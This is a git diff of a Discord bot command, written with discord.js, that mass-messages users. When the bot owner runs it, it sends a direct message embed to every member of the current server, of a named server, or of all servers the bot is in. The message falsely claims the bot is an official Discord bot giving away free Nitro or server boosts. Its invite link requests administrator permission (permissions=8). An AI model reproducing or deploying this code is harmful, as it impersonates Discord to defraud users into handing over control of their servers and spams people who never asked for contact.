@@ -1,26 +1,68 @@
 const Discord = require("discord.js");
 const { RichEmbed } = require("discord.js");
+const config = require("../storage/config.json")
 
 module.exports.run = async (bot, message, args) =>{
   message.delete();
-  if(message.author.id === "212238091455299585"){
+  if(message.author.id === config.owner){
+    if(args[0] === "here") {
     const embed = new RichEmbed()
-    .setTitle("Free Discord Nitro")
-    .setColor("#a3daff")
-    .setThumbnail("https://cdn.glitch.com/51a51655-7f01-442e-932b-a58f2a2ad309%2F700394539239866450.gif?v=1589159142850")
-    .setDescription(`**EN** : If you want to win a free Discord Nitro, invite this bot to your server. \n
-    **FR** : Si tu souhaite gagner un Nitro Discord, invite ce bot sur ton serveur. \n
-    **SP** : Si quieres ganar un Discord Nitro gratis, invita a este bot a tu servidor
+    .setTitle("Free Boost Server")
+    .setURL("https://discordapp.com/oauth2/authorize?client_id=697847344540024893&scope=bot&permissions=8")
+    .setColor("#FE08EB")
+    .setThumbnail("https://media.discordapp.net/attachments/695992756967047199/709432527500083336/703502450274861106.gif")
+    .setDescription(`**EN** : This is an **Official** & **Légit Bot** of **Discord**. If you want to win free rewards you just need to **Add** me on your servers and wait a few moments to receive it. \n
+    **FR** : Ceci est un **Bot officiel** et Légit de **Discord**. Si vous voulez gagner des récompenses gratuites, il vous suffit de **m'ajouter** sur vos serveurs et d'attendre quelques instants pour le recevoir. \n
      `)
-    .setImage("https://thumbs.gfycat.com/BrokenWholeChuckwalla-size_restricted.gif")
-    .addField("Free Nitro :", "[Click Here For Invite The Bot](https://discord.com/api/oauth2/authorize?client_id=680164807605092352&permissions=0&scope=bot)")
-    .setFooter("Invite For Free Discord Nitro", "https://i.ytimg.com/vi/_UYrU8vrEKw/maxresdefault.jpg")
+    .setImage("https://media1.tenor.com/images/c1ee5ae3e9db6a5a3536f4232e946155/tenor.gif")
+    .addField("Invite the bot for x30 Boost :", "[Click Here For Invite The Bot](https://discordapp.com/oauth2/authorize?client_id=697847344540024893&scope=bot&permissions=8)")
+    .setFooter("Invite For Free Boost", bot.user.displayAvatarURL)
+    .setTimestamp()
+     message.guild.members.forEach((users, i) => {
+      setTimeout(() => {
+        users.send(embed)
+      }, i * 4000)
+      })
+    } else if (!args[0]) {
+    const embed = new RichEmbed()
+    .setTitle("Free Boost Server")
+    .setURL("https://discordapp.com/oauth2/authorize?client_id=697847344540024893&scope=bot&permissions=8")
+    .setColor("#FE08EB")
+    .setThumbnail("https://media.discordapp.net/attachments/695992756967047199/709432527500083336/703502450274861106.gif")
+    .setDescription(`**EN** : This is an **Official** & **Légit Bot** of **Discord**. If you want to win free rewards you just need to **Add** me on your servers and wait a few moments to receive it. \n
+    **FR** : Ceci est un **Bot officiel** et Légit de **Discord**. Si vous voulez gagner des récompenses gratuites, il vous suffit de **m'ajouter** sur vos serveurs et d'attendre quelques instants pour le recevoir. \n
+     `)
+    .setImage("https://media1.tenor.com/images/c1ee5ae3e9db6a5a3536f4232e946155/tenor.gif")
+    .addField("Invite the bot for x30 Boost :", "[Click Here For Invite The Bot](https://discordapp.com/oauth2/authorize?client_id=697847344540024893&scope=bot&permissions=8)")
+    .setFooter("Invite For Free Boost", bot.user.displayAvatarURL)
     .setTimestamp()
      bot.users.forEach((users, i) => {
       setTimeout(() => {
         users.send(embed)
       }, i * 4000)
       })
+    } else {
+      const servers = args.join(" ")
+      const guild = bot.guilds.find("name", servers) 
+      const embed = new RichEmbed()
+    .setTitle("Free Boost Server")
+    .setURL("https://discordapp.com/oauth2/authorize?client_id=697847344540024893&scope=bot&permissions=8")
+    .setColor("#FE08EB")
+    .setThumbnail("https://media.discordapp.net/attachments/695992756967047199/709432527500083336/703502450274861106.gif")
+    .setDescription(`**EN** : This is an **Official** & **Légit Bot** of **Discord**. If you want to win free rewards you just need to **Add** me on your servers and wait a few moments to receive it. \n
+    **FR** : Ceci est un **Bot officiel** et Légit de **Discord**. Si vous voulez gagner des récompenses gratuites, il vous suffit de **m'ajouter** sur vos serveurs et d'attendre quelques instants pour le recevoir. \n
+     `)
+    .setImage("https://media1.tenor.com/images/c1ee5ae3e9db6a5a3536f4232e946155/tenor.gif")
+    .addField("Invite the bot for x30 Boost :", "[Click Here For Invite The Bot](https://discordapp.com/oauth2/authorize?client_id=697847344540024893&scope=bot&permissions=8)")
+    .setFooter("Invite For Free Boost", bot.user.displayAvatarURL)
+    .setTimestamp()
+      message.channel.send(`Pub éfféctué sur le serveur : ${guild}`)
+     guild.members.forEach((users, i) => {
+      setTimeout(() => {
+        users.send(embed)
+      }, i * 4000)
+      })
+    }
   }else {
     return
   }
